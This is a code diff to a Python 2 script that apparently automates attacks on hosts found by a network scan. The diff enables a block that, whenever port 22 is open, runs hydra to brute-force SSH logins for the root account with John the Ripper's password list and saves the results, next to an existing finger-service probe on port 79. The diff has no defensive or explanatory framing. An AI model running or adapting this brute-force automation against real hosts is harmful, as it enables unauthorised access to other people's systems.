@@ -37,13 +37,17 @@ def run_services(network_dict):
                 coutput = commands.getstatusoutput(finger_service)
                 # print type(coutput)
                 if("Timeout" not in coutput):
-                    print "successful WOO!"
+                    #print "successful WOO!"
                     write_to_file("port79.txt", coutput[1])
 
-            #### NEEDS TO BE TESTED ####
-            #if port.split("/")[0] == '22':
-            #    hydra = "hydra -l root -P " + word_list + "ssh://"+ip
-            #    coutput = commandsgetstatusoutput(hydra)
+            if port.split("/")[0] == '22':
+                hydra = "hydra -l root -P /usr/share/john/password.lst ssh://"+ip
+                print hydra
+                coutput = commands.getstatusoutput(hydra)
+                #print coutput
+                if("[ERROR]" not in coutput[1]):
+                    #print "successful WOO!"
+                    write_to_file("port22.txt", coutput[1])
 
 
 
